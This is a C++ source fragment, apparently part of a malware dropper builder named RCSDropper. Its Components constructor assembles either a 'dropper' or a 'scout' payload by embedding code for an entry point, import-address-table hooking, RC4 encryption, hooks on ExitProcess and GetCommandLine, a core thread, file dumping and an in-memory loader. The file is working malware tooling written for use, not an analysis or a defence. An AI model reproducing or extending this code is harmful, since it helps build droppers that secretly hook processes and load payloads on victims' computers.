#include <iomanip>
#include <iostream>
#include <string>
using namespace std;

#include "../../RCSDropper/DropperCode.h"
#include "Components.h"

Components::Components(BOOL bScout)
{
	if (!bScout)
	{
		cout << endl;
		cout << "DROPPER COMPONENTS" << endl;
		cout << endl;

		embedFunction_( (char*) DropperEntryPoint, (char*) DropperEntryPoint_End , entryPoint_);
		embedFunction_( (char*) HookIAT, (char*) HookIAT_End, hookIAT_);
		embedFunction_( (char*) ArcFour, (char*) ArcFour_End, rc4_);
		embedFunction_( (char*) ExitProcessHook, (char*) ExitProcessHook_End, exitProcess_);
		embedFunction_( (char*) GetCommandLineAHook, (char*) GetCommandLineAHook_End, getCommandLineAHook_);
		embedFunction_( (char*) GetCommandLineWHook, (char*) GetCommandLineWHook_End, getCommandLineWHook_);
		embedFunction_( (char*) CoreThreadProc, (char*) CoreThreadProc_End, coreThread_);
		embedFunction_( (char*) DumpFile, (char*) DumpFile_End, dumpFile_);

	}
	else //scout
	{
		cout << endl;
		cout << "SCOUT COMPONENTS" << endl;

		embedFunction_( (char*) DropperEntryPoint, (char*) DropperEntryPoint_End , entryPoint_);
		embedFunction_( (char*) HookIAT, (char*) HookIAT_End, hookIAT_);
		embedFunction_( (char*) ArcFour, (char*) ArcFour_End, rc4_);
		embedFunction_( (char*) MemoryLoader, (char *) MemoryLoader_End, load_);
		embedFunction_( (char*) ExitProcessHook, (char*) ExitProcessHook_End, exitProcess_);
		embedFunction_( (char*) GetCommandLineAHook, (char*) GetCommandLineAHook_End, getCommandLineAHook_);
		embedFunction_( (char*) GetCommandLineWHook, (char*) GetCommandLineWHook_End, getCommandLineWHook_);
	}
}
